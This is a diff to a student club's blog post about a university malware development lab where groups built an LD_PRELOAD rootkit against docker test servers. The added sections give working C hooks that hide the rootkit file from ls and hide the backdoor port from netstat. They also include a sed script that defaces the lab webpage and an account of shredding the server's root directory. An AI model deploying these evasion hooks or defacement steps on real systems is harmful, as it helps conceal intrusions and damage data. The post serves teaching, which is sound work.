@@ -4,7 +4,7 @@ Author: Rory Hemmings,
 June 7th 2023
 
 **Disclaimer**
-> I am not an expert in this topic, and this project is meerly my interpretation/attempt at rootkit development. If you have any suggestions for improvement, please suggest them on github issues in this [repo](https://docs.google.com/presentation/d/1U2sHxWP64e9oxL_PAg-F9cti82FOHWIan8AGZFJG8Ec/edit?usp=drive_link).
+> I am not an expert in this topic, and this project is meerly my interpretation/attempt at rootkit development. If you have any suggestions for improvement, please suggest them on github issues in this [repo](https://github.com/RoryHemmings/cyber-rootkit-s23/tree/main).
 
 For ACM Cyber this spring quarter, we decided to breanch off from our workshop/lecture based style of teaching to try something more practical. To achieve this we offered a "Malware Development Lab" and the "Secure OS development Lab" instead. Both were inteded to be low level cyber-security projects allowing people to get their hands dirty with practical cybersecurity from a development point of view. This post details the cirriculum, outcomes, and results of this quarters Malware Lab. 
 
@@ -272,8 +272,8 @@ I won't go to in depth into the vulnerability or mechanics behind how buffer ove
 
 The target machine had a couple characteristics. It was a web server hosting a static http page via apache on an Ubuntu system. Additionally, it was running sshd, and the vulnerable target program detailed in the next section.
 
-The static webpage hosted was is shown above.
 ![Website](imgs/website.png)
+The static webpage hosted was is shown above.
 
 To configure and run this target machine we used docker to setup several target machines.
 
@@ -517,26 +517,138 @@ After each group implemented their base features along with the exploit script, 
 
 ### Evasion
 
+Our first group decided to directly expand upon the base rootkit by reading further into the [original](https://h0mbre.github.io/Learn-C-By-Creating-A-Rootkit/) blog post. They inroduced 2 evasion features to hide the rootkit from `ls` and `netstat`.
 
-### Javascript Injection
+#### LS
+
+Hiding from `ls` is rather simple. In order for LS to function, it uses the `readdir` syscall to iterate through a directory. Given a pointer to a directory stream, the `readdir` syscall is meant to return the next directory entry in the directory. Calling it in a loop allows `ls` to iterate through a directory and list information about each file.
+
+However, our goal is to hide a file from ls. To do so, we can hook the `readdir` syscall, and then instruct it to skip over any file that we want. This way, as `ls` iterates through a directory, it will fail to see our malicious library.
+
+```c
+/* Hide from ls */
+struct dirent *readdir(DIR *dirp) {
+	struct dirent *(*real_readdir) (DIR *dir);
+  	real_readdir = dlsym(RTLD_NEXT, "readdir");
+	struct dirent *dir;
+  
+	/* finds file that doesn't contain rootkit.so */
+	while (dir = real_readdir(dirp))
+		if (strstr(dir->d_name, LIBRARY_FILENAME) == 0)
+			break;
+
+	return dir;
+}
+```
+
+As you can see, our code just wraps the real `readdir` syscall, which gets the next directory entry. However, our code continues calling this function, until it finds a directory entry that doesn't contain our library name. This way, our library will be skipped by ls.
+
+After including this in the rootkit, `ls` will work as normal, except that it will never output a trace of our `rootkit.so` file.
+
+> Note: using `ls -ld rootkit.so` will still work as it uses a different system call to gather information about the file. This was helpful, because it allowed us to ensure that hiding from ls was actually working
+
+#### netstat
+
+Hiding from `netstat` is slightly more invloved, however the approach is still pretty simple. `netstat` actually works by reading information from the special file `/proc/net/tcp` into a buffer, and then formatting its information out to the terminal. This file is actually just a window into the operating system to gain information about active tcp connections.
+
+Since `netstat`, has to read from this file, we can hook the `fopen` syscall used to read files, and filter out evidence of our backdoor tcp connections before returning the information to the user.
+
+To achieve this, we can read each line from `/proc/net/tcp`, and write it out to a temporary file if it doesn't contain evidence of a backdoor. Then we just return a pointer to the temporary file, so that netstat will read from our clean dummy file as opposed to `/proc/net/tcp`.
+
+```c
+/* Hide from netstat */
+FILE *fopen(const char *pathname, const char *mode)
+{
+	FILE *(*real_fopen)(const char *pathname, const char *mode);
+	real_fopen = dlsym(RTLD_NEXT, "fopen");
+
+	/* If file is not /proc/net/tcp, run fopen normally */
+	/* /proc/net/tcp -> requests info about active tcp connections from the OS */
+	if (strstr(pathname, "/proc/net/tcp") == NULL)
+		return real_fopen(pathname, mode);
+
+	/* Convert port to string */
+	char S_BIND_PORT[6];
+	itoa(BIND_PORT, S_BIND_PORT, 10);
+
+	/* Create temporary file to store clean data */
+	char line[256];
+	FILE *temp = tmpfile();
+	FILE *fp = real_fopen(pathname, mode);
+
+	/* Copy each line from /proc/net/tcp, excluding lines containing backdoor port number */
+	while (fgets(line, sizeof(line), fp))
+	{
+		/* If line doesn't contain rootkit port number, copy to clean file */
+		if (strstr(line, S_BIND_PORT) == NULL)
+			fputs(line, temp);
+	}
+
+	/* Return clean file */
+	return temp;
+}
+```
+
+Once this is included in the rootkit library, `netstat` will list all open tcp connections except those involving the rootkits backdoor port.
+
+### Webpage Injection
+
+Our second group completed the post-exploitation objective of modifying the static webpage on the target server.
+
+In order to achieve this they simply modified the html for the static webpage using `sed` to include their own css and modify the existing html. By doing this, they were able to change the text and background color of the page as a proof of concept.
+
+Although I've lost the exact script they used, it looked something like this:
+
+```sh
+sed -i "s/Unhackable/Hackable/g" index.html
+sed -i "s/I bet you can't change this text/We changed the text/g" index.html
+mkdir css
+echo "body { background-color: red; }" > css/style.css
+```
+
+After running these commands, the website went from this:
+![before](imgs/website.png)
+to this:
+![after](imgs/after.png)
+
+They completed this attack in front of a live audience to demonstrate the capabilities of a persistent root shell.
+
 ### Shred
 
-## Complications
+Finally, for our grand finale, our last team wanted to experiment a little bit and cause pure chaos. After modifying the website a bit more using javascript injection, they simply shreded the root directory of the server in front of a live-audience to see what would happen.
 
-setup was arduous
-we spent more time 
-probably better to have bigger groups
-we could cut back on lectures even more
+After some time, the website went down, and the terminal started going haywire as it couldn't even print status messages after libc was completely deleted. 
 
-making the docker container more flimsy - docker is intentionally designed to avoid being exploited in the way we did. However our rootkit would work on a monolithic server.
+While somewhat of a joke, this attack does demonstrate the capabilities of our rootkit. With persistent root access you can run literally any attack you want, from precise monitoring and spying, to wiping the system clean altogether.
 
-## References
+While we didn't have time to implement a ton of new features, some proposed features for the future include:
 
-[Techincal Breakdown of similar LD_PRELOAD rootkit](https://h0mbre.github.io/Learn-C-By-Creating-A-Rootkit/).
-[repo](https://github.com/RoryHemmings/cyber-rootkit-s23) 
-[discord](https://discord.gg/j9dgf2q):
+- Implementing a reverse shell instead of a bind shell
+- Creating a C2C server and using our rootkit to create botnets
+- Exploiting a CVE instead of our toy vulnerability for installation
+- Including a built-in keylogger with the rootkit
 
-Slides:
+## Conclusion
+
+Overall our workshop was a success, however along the way we learned some things that should be taken into consideration for the future.
+
+Namely:
+* We should have had one group working on one big rootkit as opposed to 3 smaller ones
+	- Would have allowed for better overall rootkit with more features
+* The target environment was extremely hacky, and we should have put more thought into it from the start.
+	- We were simulating a monolithic server with docker, which lead to several problems
+* Exploiting a toy vulnerability was a bit out of scope of this workshop. We probably should have used an old CVE + Msfvenom to simplify exploitation and provide more practical experience.
+
+If you are interested in learning more, I highly recommend the resources below.
+
+## Resources
+
+### Links
+* [Techincal Breakdown of similar LD_PRELOAD rootkit](https://h0mbre.github.io/Learn-C-By-Creating-A-Rootkit/).
+* [repo](https://github.com/RoryHemmings/cyber-rootkit-s23) 
+* [discord](https://discord.gg/j9dgf2q):
+
+### Slides:
 * [week 1](https://docs.google.com/presentation/d/1EFRjWrZO-xo2kFhywVZy9M7Y5B-amZuXKzCrS-XNfLQ/edit?usp=drive_link)
 * [week 2](https://docs.google.com/presentation/d/19CA9Lu7Mfybz7OL6jksWFF0hEyisUwTRJRgKflugenY/edit?usp=drive_link)
 * [week 3](https://docs.google.com/presentation/d/1U2sHxWP64e9oxL_PAg-F9cti82FOHWIan8AGZFJG8Ec/edit?usp=drive_link)
